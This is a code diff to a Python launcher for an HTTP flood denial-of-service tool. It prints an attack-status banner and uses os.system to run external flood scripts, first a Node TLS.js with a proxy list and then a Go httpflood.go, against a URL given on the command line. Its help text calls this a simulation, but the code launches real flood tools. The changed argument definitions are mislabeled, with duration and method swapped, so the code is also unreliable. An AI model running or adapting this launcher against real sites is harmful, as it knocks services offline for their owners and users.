@@ -57,7 +57,7 @@ def main(url, threads, time, methods):
     print(f"        \x1b[38;2;233;233;233mISP     : [ \x1b[38;2;0;255;255m{isp_info} \x1b[38;2;233;233;233m]")
     print(f"        \x1b[38;2;233;233;233mTHREADS : [ \x1b[38;2;0;255;255m{threads} \x1b[38;2;233;233;233m]")
     print(f"        \x1b[38;2;233;233;233mTIME    : [ \x1b[38;2;0;255;255m{time} \x1b[38;2;233;233;233m]")
-    print(f"        \x1b[38;2;233;233;233mMETHOD  : [ \x1b[38;2;0;255;255m{methods} \x1b[38;2;233;233;233m]")
+    print(f"        \x1b[38;2;233;233;233mMETHOD  : [ \x1b[38;2;0;255;255mHTTP-FLOOD \x1b[38;2;233;233;233m]")
     print(f"   Attack Details :")
     print(f"        \x1b[38;2;233;233;233mSTATUS : [ \x1b[38;2;0;212;14mAttack With 1 Conc \x1b[38;2;233;233;233m]")
     print(f"        \x1b[38;2;233;233;233mHOUR   : [ \x1b[38;2;0;255;255m{current_time} \x1b[38;2;233;233;233m]")
@@ -65,13 +65,12 @@ def main(url, threads, time, methods):
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='Simulate an attack command.')
-    parser.add_argument('methods', type=str, help='URL to attack')
-    parser.add_argument('url', type=str, help='Threads for attack')
-    parser.add_argument('time', type=int, help='Time duration of attack')
-    parser.add_argument('threads', type=str, help='Methods used')
+    parser.add_argument('url', type=str, help='URL to attack')
+    parser.add_argument('threads', type=str, help='Threads for attack')
+    parser.add_argument('methods', type=int, help='Time duration of attack')
+    parser.add_argument('time', type=str, help='Methods used')
 
     args = parser.parse_args()
 
-    os.system(f'node TLS.js {args.url} {args.time} 5000 {args.threads} proxies.txt')
-
-    main(args.methods, args.url, args.time, args.threads)
+    os.system(f'go run httpflood.go {args.url} {args.threads} {args.methods} {args.time}')
+    main(args.url, args.threads, args.methods, args.time)
